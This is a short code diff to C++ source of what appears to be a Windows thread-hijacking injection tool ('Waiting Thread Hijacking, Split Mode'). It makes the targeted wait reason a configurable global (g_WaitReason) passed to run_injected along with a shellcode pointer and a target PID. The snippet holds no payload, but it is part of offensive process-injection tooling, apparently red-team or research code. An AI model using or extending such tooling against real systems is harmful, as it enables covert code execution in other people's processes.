@@ -25,6 +25,7 @@ enum t_state {
     STATE_MAX
 };
 
+DWORD g_WaitReason = WrQueue;
 
 ULONGLONG get_env(const char *var_name, bool isHex = false)
 {
@@ -70,7 +71,7 @@ t_result execute_state(t_state state)
         return RET_WRITE_FAILED;
     }
     if (state == STATE_EXECUTE) {
-        if (run_injected(processID, shellcodePtr, WrQueue)) {
+        if (run_injected(processID, shellcodePtr, g_WaitReason)) {
             return RET_OK;
         }
         return RET_EXECUTE_FAILED;
@@ -127,7 +128,7 @@ int main(int argc, char* argv[])
         // check process:
         DWORD processID = 0;
         if (argc < 2) {
-            std::cout << "Waiting Thread Hijacking (Split Mode). Target: WrQueue \n"
+            std::cout << "Waiting Thread Hijacking (Split Mode). Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
                 << "Arg <PID>" << std::endl;
             return 0;
         }
